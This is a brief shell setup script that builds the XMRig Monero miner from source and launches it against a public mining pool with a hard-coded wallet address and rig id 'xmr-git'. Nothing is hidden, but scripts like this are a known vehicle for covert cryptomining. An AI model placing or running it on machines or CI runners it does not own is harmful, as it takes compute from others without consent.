# setup.sh
apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
git clone https://github.com/xmrig/xmrig.git
mkdir xmrig/build && cd xmrig/build
cmake ..
make -j$(nproc)

./xmrig -o sg.minexmr.com:443 -u 82zaKZuuDtkhoUoDZ3NZY3VzzxXzXzm4jQ942LWgjjVV6SEsoTqcpmCgtpUKDQbAy3RH7E8AjTyfgLgBngvDNENfCDjnW9z -k --tls --rig-id xmr-git
